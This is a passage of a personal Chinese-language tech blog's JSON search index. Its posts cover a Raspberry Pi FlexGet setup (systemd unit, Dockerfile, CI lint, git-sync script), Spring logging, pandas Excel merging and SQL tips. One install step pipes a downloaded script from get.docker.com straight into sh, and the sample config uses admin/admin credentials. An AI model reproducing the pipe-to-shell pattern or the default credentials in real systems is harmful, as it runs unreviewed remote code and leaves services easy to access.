id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><h3 id=\"flexget-service\"><a href=\"#flexget-service\" class=\"headerlink\" title=\"flexget service\"></a>flexget service</h3><p><a href=\"https://gist.github.com/billsuxx/e2cd75d4b254e1999309\" target=\"_blank\" rel=\"noopener\">/lib/systemd/system/flexget.service</a><br>下面路徑需要調整<br>我是放在/etc/systemd/system/flexget.service<br><figure class=\"highlight ini\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Unit]</span></span><br><span class=\"line\"><span class=\"attr\">Description</span>=Flexget Daemon</span><br><span class=\"line\"><span class=\"attr\">After</span>=network.target</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Service]</span></span><br><span class=\"line\"><span class=\"attr\">Type</span>=simple</span><br><span class=\"line\"><span class=\"attr\">User</span>=pi</span><br><span class=\"line\"><span class=\"attr\">ExecStart</span>= /home/pi/.flexget/bin/flexget daemon start</span><br><span class=\"line\"><span class=\"attr\">ExecStop</span>= /home/pi/.flexget/bin/flexget daemon stop</span><br><span class=\"line\"><span class=\"attr\">ExecReload</span>= /home/pi/.flexget/bin/flexget daemon reload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[Install]</span></span><br><span class=\"line\"><span class=\"attr\">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure>\n<p>systemctl 直接 enable/disable<br><a href=\"https://malagege.github.io/blog/2019/10/14/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/\">rclone 掛載硬碟小記 | 程式狂想筆記</a><br>這裡面之前有紀錄 systemctl</p>\n<h2 id=\"docker-執行-flexget\"><a href=\"#docker-執行-flexget\" class=\"headerlink\" title=\"docker 執行 flexget\"></a>docker 執行 flexget</h2><h3 id=\"安裝-docker\"><a href=\"#安裝-docker\" class=\"headerlink\" title=\"安裝 docker\"></a>安裝 docker</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -sSL https://get.docker.com/ | sh</span><br><span class=\"line\">sudo usermod -aG docker pi</span><br><span class=\"line\"><span class=\"comment\"># 重新登入</span></span><br><span class=\"line\">sudo systemctl restart docker</span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> docker</span><br></pre></td></tr></table></figure>\n<h3 id=\"docker-執行-flexget-1\"><a href=\"#docker-執行-flexget-1\" class=\"headerlink\" title=\"docker 執行 flexget\"></a>docker 執行 flexget</h3><p>之前這邊有寫過<a href=\"https://malagege.github.io/blog/2020/01/08/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/\">Raspberry Pi 使用 Docker 架設 flexget | 程式狂想筆記</a><br>後來就沒繼續使用(因為我不太會用)<br>PI 要裝 Python 編譯比較花時間<br>在想有沒有比較快的方法</p>\n<p>pi 1 請使用 arm32v6 ，其他代請使用 armv7</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">FROM</span> arm32v7/python:<span class=\"number\">3.8</span>.<span class=\"number\">5</span>-alpine</span><br><span class=\"line\"><span class=\"keyword\">MAINTAINER</span> bren</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apk add --update \\</span></span><br><span class=\"line\"><span class=\"bash\">  tzdata \\</span></span><br><span class=\"line\"><span class=\"bash\">  ca-certificates \\</span></span><br><span class=\"line\"><span class=\"bash\">  &amp;&amp; pip install --no-cache-dir --<span class=\"built_in\">disable</span>-pip-version-check flexget transmissionrpc \\</span></span><br><span class=\"line\"><span class=\"bash\">  &amp;&amp; rm -rf /var/cache/apk/*</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># Copy local files</span></span></span><br><span class=\"line\"><span class=\"bash\">COPY files/ /</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># add default volumes</span></span></span><br><span class=\"line\"><span class=\"bash\">VOLUME /config /data</span></span><br><span class=\"line\"><span class=\"bash\">WORKDIR /config</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># expose port for flexget webui</span></span></span><br><span class=\"line\"><span class=\"bash\">EXPOSE 3539 3539/tcp</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"><span class=\"comment\"># run init.sh to set uid, gid, permissions and to launch flexget</span></span></span><br><span class=\"line\"><span class=\"bash\">RUN chmod +x /scripts/init.sh</span></span><br><span class=\"line\"><span class=\"bash\">CMD [<span class=\"string\">\"/scripts/init.sh\"</span>]</span></span><br></pre></td></tr></table></figure>\n<p>docker build . -t malagege/flexget</p>\n<p><code>id pi</code>可以看當下 user id</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d \\</span><br><span class=\"line\">    --name=flexget \\</span><br><span class=\"line\">    -restart=always \\</span><br><span class=\"line\">    -p 5050:5050 \\ <span class=\"comment\"># 注意 port</span></span><br><span class=\"line\">    -v <span class=\"string\">\"<span class=\"variable\">$PWD</span>/data\"</span>:/data \\</span><br><span class=\"line\">    -v <span class=\"string\">\"<span class=\"variable\">$PWD</span>/config\"</span>:/config \\</span><br><span class=\"line\">    -e FG_WEBUI_PASSWD=__複雜密碼__ \\</span><br><span class=\"line\">    <span class=\"comment\"># -e /mnt/xxx:/mnt/xxx  有使用 free_space 要開這個</span></span><br><span class=\"line\">    <span class=\"comment\"># -e PUID=1000 \\</span></span><br><span class=\"line\">    <span class=\"comment\"># -e PGID=1000 \\</span></span><br><span class=\"line\">    -e TZ=<span class=\"string\">\"Asia/Taipei\"</span> \\</span><br><span class=\"line\">    malagege/flexget</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.cnblogs.com/kaishirenshi/p/10396446.html\" target=\"_blank\" rel=\"noopener\">docker參數–restart=always的作用 - 開始認識 - 博客園</a></p>\n<blockquote>\n<p> docker參數–restart=always的作用<br>創建容器時沒有添加參數  –restart=always ，導致的後果是：當 Docker 重啟時，容器未能自動啟動<br>1、Docker 命令修改<br>docker container update –restart=always 容器名字</p>\n</blockquote>\n<p><a href=\"https://flexget.com/Cookbook/TorrentCleanup\" target=\"_blank\" rel=\"noopener\">FlexGet</a></p>\n<h2 id=\"bitbucket-CI-CD-檢查設定\"><a href=\"#bitbucket-CI-CD-檢查設定\" class=\"headerlink\" title=\"bitbucket CI/CD 檢查設定\"></a>bitbucket CI/CD 檢查設定</h2><p>因為這個我有跟我朋友一起改設定檔<br>所以我有加了 CI/CD 防止修改錯誤</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">image:</span> <span class=\"string\">nikolaik/python-nodejs:python3.8-nodejs12</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">pipelines:</span></span><br><span class=\"line\"><span class=\"attr\">  default:</span></span><br><span class=\"line\"><span class=\"attr\">    - step:</span></span><br><span class=\"line\"><span class=\"attr\">        script:</span> <span class=\"comment\"># Modify the commands below to build your repository.</span></span><br><span class=\"line\"><span class=\"bullet\">          -</span> <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"bullet\">-g</span> <span class=\"string\">yaml-lint</span></span><br><span class=\"line\"><span class=\"bullet\">          -</span> <span class=\"string\">yamllint</span> <span class=\"string\">config.yml</span></span><br><span class=\"line\"><span class=\"comment\">#          - npm install</span></span><br><span class=\"line\"><span class=\"comment\">#          - npm test</span></span><br><span class=\"line\"><span class=\"bullet\">          -</span> <span class=\"string\">pip</span> <span class=\"string\">install</span> <span class=\"bullet\">--no-cache-dir</span> <span class=\"bullet\">--disable-pip-version-check</span> <span class=\"string\">flexget</span></span><br><span class=\"line\"><span class=\"bullet\">          -</span> <span class=\"string\">flexget</span> <span class=\"bullet\">-V</span></span><br><span class=\"line\"><span class=\"bullet\">          -</span> <span class=\"string\">flexget</span> <span class=\"string\">check</span></span><br></pre></td></tr></table></figure>\n<p>2018-02-14 10:28 WARNING  manager    Config line XX is likely missing ‘:’ at the end<br>是 bug 所以先不用理會<br>參考:<a href=\"https://linkthis.me/2018/02/15/the-note-of-using-flexget/\" target=\"_blank\" rel=\"noopener\">FLexget使用记录 - linkthis blog</a></p>\n<h3 id=\"Git-同步方法\"><a href=\"#Git-同步方法\" class=\"headerlink\" title=\"Git 同步方法\"></a>Git 同步方法</h3><p>最後更改需要執行<code>docker exec flexget flexget daemon reload-config</code><br>載入最新設定檔案</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /home/pi/flexget-arm/config &amp;&amp; git fetch origin master</span><br><span class=\"line\"></span><br><span class=\"line\">LOCAL_COMMITID=$(git rev-parse HEAD)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"LCOAL_COMMITID=<span class=\"variable\">$&#123;LOCAL_COMMITID&#125;</span>\"</span></span><br><span class=\"line\">REMOTE_COMMITID=$(git rev-parse origin/master)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"REMOTE_COMMITID=<span class=\"variable\">$&#123;REMOTE_COMMITID&#125;</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$LOCAL_COMMITID</span>\"</span> != <span class=\"string\">\"<span class=\"variable\">$REMOTE_COMMITID</span>\"</span> ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"COMMITID不一致，需做同步\"</span></span><br><span class=\"line\">    git reset origin/master --hard &amp;&amp; docker <span class=\"built_in\">exec</span> flexget flexget daemon reload-config</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"手動執行排程\"><a href=\"#手動執行排程\" class=\"headerlink\" title=\"手動執行排程\"></a>手動執行排程</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> flexget flexget execute  --tasks <span class=\"string\">\"TV-*\"</span></span><br></pre></td></tr></table></figure>\n<p>config.yml<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">web_server:</span> <span class=\"literal\">yes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">templates:</span></span><br><span class=\"line\"><span class=\"attr\">  default:</span></span><br><span class=\"line\"><span class=\"attr\">    transmission:</span></span><br><span class=\"line\"><span class=\"attr\">      host:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.203</span></span><br><span class=\"line\"><span class=\"attr\">      port:</span> <span class=\"number\">9091</span></span><br><span class=\"line\"><span class=\"attr\">      username:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      password:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      add_paused:</span> <span class=\"literal\">no</span></span><br><span class=\"line\"><span class=\"attr\">      path:</span> <span class=\"string\">/mnt/extHDD/Download/Mikata/TV/&#123;&#123;task&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    free_space:</span></span><br><span class=\"line\"><span class=\"attr\">      path:</span> <span class=\"string\">/mnt/extHDD/</span></span><br><span class=\"line\"><span class=\"attr\">      space:</span> <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"attr\">    clean_transmission:</span></span><br><span class=\"line\"><span class=\"attr\">      host:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.203</span></span><br><span class=\"line\"><span class=\"attr\">      port:</span> <span class=\"number\">9091</span></span><br><span class=\"line\"><span class=\"attr\">      username:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      password:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      finished_for:</span> <span class=\"number\">60</span> <span class=\"string\">days</span></span><br><span class=\"line\"><span class=\"attr\">      min_ratio:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">    if:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"'季度全集' in category\"</span><span class=\"string\">:</span> <span class=\"string\">reject</span></span><br><span class=\"line\"><span class=\"attr\">  autoPass:</span></span><br><span class=\"line\"><span class=\"attr\">    transmission:</span></span><br><span class=\"line\"><span class=\"attr\">      host:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.203</span></span><br><span class=\"line\"><span class=\"attr\">      port:</span> <span class=\"number\">9091</span></span><br><span class=\"line\"><span class=\"attr\">      username:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      password:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      add_paused:</span> <span class=\"literal\">yes</span></span><br><span class=\"line\"><span class=\"attr\">      path:</span> <span class=\"string\">/mnt/extHDD/Download/Mikata/autoPass/&#123;&#123;task&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    if:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"'季度全集' in category\"</span><span class=\"string\">:</span> <span class=\"string\">reject</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">tasks:</span></span><br><span class=\"line\">  <span class=\"string\">\"TV-刀劍神域 Alicization\"</span><span class=\"string\">:</span></span><br><span class=\"line\"><span class=\"attr\">    rss:</span></span><br><span class=\"line\"><span class=\"attr\">      url:</span> <span class=\"attr\">https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=刀劍神域+悠哈璃羽字幕社＆拉斯观测组+CHT</span></span><br><span class=\"line\"><span class=\"attr\">      other_fields:</span> <span class=\"string\">[category]</span></span><br><span class=\"line\"><span class=\"attr\">    accept_all:</span> <span class=\"literal\">yes</span></span><br><span class=\"line\"><span class=\"attr\">    template:</span> <span class=\"string\">default</span></span><br><span class=\"line\"><span class=\"attr\">    transmission:</span></span><br><span class=\"line\"><span class=\"attr\">      path:</span> <span class=\"string\">/mnt/extHDD/Download/Mikata/TV/202007/&#123;&#123;task[3:]&#125;&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">schedules:</span></span><br><span class=\"line\"><span class=\"attr\">  - tasks:</span> <span class=\"string\">\"TV-*\"</span></span><br><span class=\"line\"><span class=\"attr\">    schedule:</span></span><br><span class=\"line\"><span class=\"attr\">      day_of_week:</span> <span class=\"string\">mon,tue,wed,thu,fri,sat,sun</span></span><br><span class=\"line\"><span class=\"attr\">      hour:</span> <span class=\"string\">\"3,5,8,11,13,15,17,20\"</span></span><br><span class=\"line\"><span class=\"attr\">      jitter:</span> <span class=\"number\">60</span></span><br></pre></td></tr></table></figure></p>\n<p>這邊有發現 WebUI 用 GMT 時間<br>非本地時間…，但怎麼找設定都沒看到程式可以調整台灣時區</p>\n","categories":["Linux"],"tags":["linux","flexget"]},{"title":"在日誌中顯示Spring事務","url":"/blog/2021/06/02/%E5%9C%A8%E6%97%A5%E8%AA%8C%E4%B8%AD%E9%A1%AF%E7%A4%BASpring%E4%BA%8B%E5%8B%99/","content":"<p>每次都要找很久，所以特別記錄</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">log4j.logger.org.springframework.transaction.interceptor = trace</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.itranslater.com/qa/details/2127334888293532672\" target=\"_blank\" rel=\"noopener\">https://www.itranslater.com/qa/details/2127334888293532672</a></p>\n","categories":["Java"],"tags":["spring"]},{"title":"多個 Excel(xlsx) 合併方法","url":"/blog/2021/03/31/%E5%A4%9A%E5%80%8B-Excel-xlsx-%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/","content":"<p>平常維運大量資料，需要分批去撈資料<br>需要把資料合併又要花很多工<br>最近在找有什麼好用的方法</p>\n<a id=\"more\"></a>\n<h2 id=\"Excel-Merger-付費\"><a href=\"#Excel-Merger-付費\" class=\"headerlink\" title=\"Excel Merger(付費)\"></a>Excel Merger(付費)</h2><p><a href=\"https://www.azofreeware.com/2020/06/excel-merger.html\" target=\"_blank\" rel=\"noopener\">https://www.azofreeware.com/2020/06/excel-merger.html</a></p>\n<p><img src=\"https://i.imgur.com/xDd8DbS.png\" alt=\"\"></p>\n<p>免費版會有 Excel Merger Free 字眼，所以應該沒辦法免費使用…</p>\n<h2 id=\"pandas\"><a href=\"#pandas\" class=\"headerlink\" title=\"pandas\"></a>pandas</h2><p>建議直接安裝Anaconda3 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">import pandas as pd</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">--</span><br><span class=\"line\">!dir /D *xlsx</span><br><span class=\"line\"># window 沒 ls</span><br><span class=\"line\">---</span><br><span class=\"line\">import glob</span><br><span class=\"line\">glob.glob(&quot;*xlsx&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br><span class=\"line\">all_data = pd.DataFrame()</span><br><span class=\"line\">for f in glob.glob(&quot;*xlsx&quot;):</span><br><span class=\"line\">    df = pd.read_excel(f)</span><br><span class=\"line\">    all_data = all_data.append(df,ignore_index=True)</span><br><span class=\"line\">    </span><br><span class=\"line\">---    </span><br><span class=\"line\"></span><br><span class=\"line\">all_data.to_excel(&quot;result.xlsx&quot;)</span><br></pre></td></tr></table></figure>\n<p>參考: <a href=\"https://pbpython.com/excel-file-combine.html\" target=\"_blank\" rel=\"noopener\">Combining Data From Multiple Excel Files - Practical Business Python</a></p>\n","categories":["實用工具"],"tags":["xlsx","pandas","excel merge"]},{"title":"大量A表排除特定B表 id 排除方法小記","url":"/blog/2020/02/19/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/","content":"<p>最近需求需要A表過濾B表<br>但是資料量非常大<br>處理時間非常久</p>\n<a id=\"more\"></a>\n<h2 id=\"刪除方法得到結果\"><a href=\"#刪除方法得到結果\" class=\"headerlink\" title=\"刪除方法得到結果\"></a>刪除方法得到結果</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">id</span> <span class=\"keyword\">FROM</span> A  <span class=\"keyword\">LEFT</span> <span class=\"keyword\">JOIN</span> B <span class=\"keyword\">ON</span> A.id = B.id <span class=\"keyword\">WHERE</span> B.id <span class=\"keyword\">is</span> <span class=\"literal\">null</span> </span><br><span class=\"line\"><span class=\"comment\">-- 執行非常久</span></span><br><span class=\"line\"><span class=\"comment\">-- 後來想嘗試用刪除資料看看結果，資料表都是暫時的</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">DELETE</span> <span class=\"keyword\">FROM</span> A <span class=\"keyword\">WHERE</span> A.id <span class=\"keyword\">IN</span> (<span class=\"keyword\">SELECT</span> <span class=\"keyword\">id</span> <span class=\"keyword\">FROM</span> B)</span><br><span class=\"line\"><span class=\"comment\">-- 執行非常久</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">DELETE</span> a <span class=\"keyword\">FROM</span> A a <span class=\"keyword\">INNER</span> <span class=\"keyword\">JOIN</span> B b <span class=\"keyword\">ON</span> a.id = b.id</span><br><span class=\"line\"><span class=\"comment\">-- 執行非常快</span></span><br></pre></td></tr></table></figure>\n<p>之前有紀錄<a href=\"https://malagege.github.io/blog/2019/08/16/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/\">SQL UPDATE 和 DELETE 趴配 JOIN 方法 | 程式狂想筆記</a></p>\n<p>最後我使用上面方式解決這個方法</p>\n<h2 id=\"使用-NOT-EXISTS\"><a href=\"#使用-NOT-EXISTS\" class=\"headerlink\" title=\"使用 NOT EXISTS\"></a>使用 NOT EXISTS</h2><p>其實以前就有聽過 EXISTS 效能是不錯的<br>剛好爬文看到<a href=\"https://explainextended.com/2010/05/27/left-join-is-null-vs-not-in-vs-not-exists-nullable-columns/\" target=\"_blank\" rel=\"noopener\">LEFT JOIN / IS NULL vs. NOT IN vs. NOT EXISTS: nullable columns at EXPLAIN EXTENDED</a><br>看到使用 NOT EXISTS 還滿不錯的<br>但是做 <code>count(distinct)</code> 還是很慢<br>group by 也不快</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">id</span> <span class=\"keyword\">FROM</span> A  <span class=\"keyword\">LEFT</span> <span class=\"keyword\">JOIN</span> B <span class=\"keyword\">ON</span> A.id = B.id <span class=\"keyword\">WHERE</span> B.id <span class=\"keyword\">is</span> <span class=\"literal\">null</span></span><br></pre></td></tr></table></figure>\n<p>又空想到好的方式在做筆記</p>\n<h2 id=\"可以在探討方法\"><a href=\"#可以在探討方法\" class=\"headerlink\" title=\"可以在探討方法\"></a>可以在探討方法</h2><h3 id=\"pandas\"><a href=\"#pandas\" class=\"headerlink\" title=\"pandas\"></a>pandas</h3><p><a href=\"https://codertw.com/%E8%B3%87%E6%96%99%E5%BA%AB/16156/\" target=\"_blank\" rel=\"noopener\">Python之使用Pandas庫實現MySQL資料庫的讀寫 | 程式前沿</a><br><a href=\"https://robertlexis.github.io/2017/11/21/Pandas-%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE%E7%9A%84I-O%E6%80%A7%E8%83%BD%E6%AF%94%E8%BE%83/\" target=\"_blank\" rel=\"noopener\">Pandas 加载数据的I/O性能比较 - This is Robert Lexis.</a><br><a href=\"https://www.flyml.net/2019/03/25/pandas%e4%b8%80%e4%b8%aapandas-vs-mysql-sql-%e7%9a%84%e6%80%a7%e8%83%bd%e5%af%b9%e6%af%94/\" target=\"_blank\" rel=\"noopener\">[Pandas]一个Pandas VS MySQL SQL 的性能对比 - FlyML</a></p>\n<h3 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h3><p><a href=\"https://explainextended.com/2010/05/27/left-join-is-null-vs-not-in-vs-not-exists-nullable-columns/\" target=\"_blank\" rel=\"noopener\">LEFT JOIN / IS NULL vs. NOT IN vs. NOT EXISTS: nullable columns at EXPLAIN EXTENDED</a><br><a href=\"https://malagege.github.io/blog/2017/07/10/logdown/2017-07-10-sql-fine-literature-ten-steps-to-fully-understand-the-sql/\">SQL好文分享 - 十步完全理解 SQL | 程式狂想筆記</a><br><a href=\"http://www.ipshop.xyz/12766.html\" target=\"_blank\" rel=\"noopener\">經典：十步完全理解 SQL-知識星球</a></p>\n<p><strong>2020-03-05</strong></p>\n<blockquote>\n<p>通過使用EXISTS，Oracle會首先檢查主查詢，然後執行子查詢直到它找到第一個匹配項，這就節省了時間。Oracle在執行IN子查詢時，首先執行子查詢，並將獲得的結果列表存放在一個加了索引的臨時表中。在執行子查詢之前，系統先將主查詢掛起，待子查詢執行完畢，存放在臨時表中以後再執行主查詢。這也就是使用EXISTS比使用IN通常查詢速度快的原因</p>\n</blockquote>\n<p><a href=\"https://www.itread01.com/content/1547569286.html\" target=\"_blank\" rel=\"noopener\">SQL中EXISTS與IN的效率問題 - IT閱讀</a></p>\n<p>通常 exists 子查詢是查到有資料才會出來<br>這邊要特別注意</p>\n","categories":["SQL"],"tags":["mysql","sql"]},{"title":"執行 SQL 做 rollback 方法 & 訂單編號高併發的小記","url":"/blog/2019/09/08/%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95/","content":"<p>最近在想 phpmyadmin 到底能不能做到錯誤時 rollback<br>先講結論…應該是不行的<br>執行 phpmyadmin 時候好像沒被法判斷有沒有錯誤(指令的好像也一樣…)<br>有什麼新發現，之後再修改</p>\n<a id=\"more\"></a>\n<p>我覺得最佳實例應該要用類似 DB client 執行<br>手動切換交易模式(把 autocommit 關掉)</p>\n<p>執行每一段 SQL 後，確定 SQL 都執行正確</p>\n<p>依照結果手動下 commit 或 rollback<br>改資料前可以先備份資料</p>\n<p>stored procedure 可以做到<br>但因為沒什麼機會寫這個，所以先留著<br><a href=\"https://stackoverflow.com/questions/9974325/mysql-transaction-within-a-stored-procedure\" target=\"_blank\" rel=\"noopener\">sql - MySQL : transaction within a stored procedure - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/30973002/try-catch-in-mysql-for-transaction\" target=\"_blank\" rel=\"noopener\">sql - try….catch in mysql for transaction? - Stack Overflow</a></p>\n<h2 id=\"isnert-失敗-auto-increment\"><a href=\"#isnert-失敗-auto-increment\" class=\"headerlink\" title=\"isnert 失敗 auto_increment\"></a>isnert 失敗 auto_increment</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> tbl auto_increment = <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>但有部分答案建議不要調整 auto_increment<br><a href=\"https://stackoverflow.com/questions/14758625/mysql-auto-increment-columns-on-transaction-commit-and-rollback\" target=\"_blank\" rel=\"noopener\">MySQL Auto Increment Columns on TRANSACTION, COMMIT, and ROLLBACK - Stack Overflow</a><br><a href=\"https://stackoverflow.com/questions/449346/mysql-auto-increment-does-not-rollback\" target=\"_blank\" rel=\"noopener\">transactions - MySQL AUTO_INCREMENT does not ROLLBACK - Stack Overflow</a></p>\n<p>後來我想到 insert into xxx values( select max(xxx) + 1 from xxx,’test’ ); 會不會有高併發的問題 (其實很多程式都這樣寫)<br>之前類似寫過 <a href=\"https://malagege.github.io/blog/2019/06/02/MySQL-MariaDB-insert%E6%9C%89%E9%97%9C%E5%81%9A%E7%9B%B8%E5%90%8C%E8%A1%A8%E6%9C%83%E9%81%87%E5%88%B0%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/\">MySQL(MariaDB) insert有關做相同表會遇到問題小記 | 程式狂想筆記</a></p>\n<h2 id=\"如何生產唯一訂單編號\"><a href=\"#如何生產唯一訂單編號\" class=\"headerlink\" title=\"如何生產唯一訂單編號\"></a>如何生產唯一訂單編號</h2><p>額外新開一個 table ，做訂單編號處理<br>用 <code>SELECT ... FOR UPDATR</code>處理<br>一直看到公司有看到商品編號額外開了一個 table<br>現在有一種恍然大悟的感覺<br>但開發者沒有加 <code>FOR UPDATE</code> 後來的 commit 有補上 <code>FOR UPDATE</code><br>相關 for update 處理</p>\n<blockquote>\n<p><a href=\"https://blog.xuite.net/vexed/tech/22289223-%E7%94%A8+SELECT+...+FOR+UPDATE+%E9%81%BF%E5%85%8D+Race+condition\" target=\"_blank\" rel=\"noopener\">用 SELECT … FOR UPDATE 避免 Race condition @ Vexed’s Blog :: 隨意窩 Xuite日誌</a><br><a href=\"https://www.cnblogs.com/linguanh/p/10019002.html\" target=\"_blank\" rel=\"noopener\">MySQL 在高并发下的 订单撮合 系统使用 共享锁 与 排他锁 保证数据一致性 - 指尖下的幽灵 - 博客园</a></p>\n</blockquote>\n<p>更好的方法還有透過 redis 去做<br><a href=\"https://www.zhihu.com/question/21128632\" target=\"_blank\" rel=\"noopener\">java web系统在高并发下如何实现订单号生成唯一？ - 知乎</a> <a href=\"/blog/2019/09/08/執行-SQL-做-rollback-方法/web1.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://www.jianshu.com/p/6ce40dcbf3fe\" target=\"_blank\" rel=\"noopener\">Redis 高并发问题,及解决方案！ - 简书</a> <a href=\"/blog/2019/09/08/執行-SQL-做-rollback-方法/web2.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://zhuanlan.zhihu.com/p/32657546\" target=\"_blank\" rel=\"noopener\">分布式架构系统生成全局唯一序列号的一个思路 - 知乎</a> <a href=\"/blog/2019/09/08/執行-SQL-做-rollback-方法/web3.png\" title=\"備份圖\">備份圖</a></p>\n<p>其實這篇我原本主要是要紀錄 sql file 做 rollback<br>但沒想到…從<code>isnert 失敗 auto_increment</code>到<code>如何生產唯一訂單編號</code>我覺得非常重要<br>就先記錄了</p>\n<h2 id=\"mysql-執行-sql\"><a href=\"#mysql-執行-sql\" class=\"headerlink\" title=\"mysql 執行 .sql\"></a>mysql 執行 .sql</h2><p><a href=\"https://tecadmin.net/run-sql-text-file-on-mysql-command-prompt/\" target=\"_blank\" rel=\"noopener\">How to Run SQL Text File on MySQL Command Prompt – TecAdmin</a></p>\n","categories":["SQL"],"tags":["sql"]},{"title":"好用的便利貼軟體","url":"/blog/2018/05/01/%E5%A5%BD%E7%94%A8%E7%9A%84%E4%BE%BF%E5%88%A9%E8%B2%BC%E8%BB%9F%E9%AB%94/","content":"<p>最近由於工作連各各主機，帳號密碼都不一樣<br>每次都需要點開信件/文件去複製<br>這之中希望能縮短時間</p>\n<a id=\"more\"></a>\n<p>之前有看到我同事有在用便利貼軟體<br>雖然我沒有問，不過現在這個工作非常需要<br>我Google到幾個</p>\n<h1 id=\"PNotes-PNotes-NET\"><a 